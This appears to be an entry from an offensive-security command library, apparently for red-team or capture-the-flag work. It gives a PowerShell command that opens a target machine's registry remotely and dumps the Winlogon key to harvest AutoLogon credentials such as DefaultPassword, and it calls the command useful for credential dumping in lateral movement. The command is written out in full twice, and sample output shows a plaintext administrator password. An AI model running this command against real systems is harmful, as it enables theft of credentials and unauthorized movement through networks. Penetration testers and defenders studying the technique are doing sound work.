---
id: ab2d27ed-ab27-417f-ae6c-e18d92e41edd
name: read-remote-winlogon-registry-key
type: command
executor: powershell
data: >-
  $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine',
  '$_TARGET_HOST',[Microsoft.Win32.RegistryView]::Registry64); $winlogon =
  $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon');
  $winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
output: null
created_at: '2023-04-06T03:56:06.526142+00:00'
updated_at: '2023-04-10T20:26:17.815665+00:00'
platforms:
  - Windows
tags:
  - registry
  - credential-access
verified: true
validated: true
---

# read-remote-winlogon-registry-key

## Command

```powershell
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', '$_TARGET_HOST',[Microsoft.Win32.RegistryView]::Registry64)
$winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
$winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
```

## Description

This PowerShell command opens a remote registry on a target host and dumps the Winlogon subkey values, potentially revealing AutoLogon credentials like DefaultPassword. Useful for credential dumping in lateral movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_HOST | Remote hostname or IP (e.g., dc.htb.local) | Yes |
| RegistryView.Registry64 | Ensures 64-bit view compatibility | Built-in |

## Examples

### Basic Usage

```powershell
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'target.dc.local',[Microsoft.Win32.RegistryView]::Registry64)
$winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
$winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
```

## Expected Output

Key-value pairs, e.g.,

AutoAdminLogon : 1
DefaultPassword : password123
DefaultUserName : Administrator

## Related

- [[procedures/Abusing-Backup-Operators-Group-for-Sensitive-File-Access]]
- [[Credential-Dumping-Techniques]]
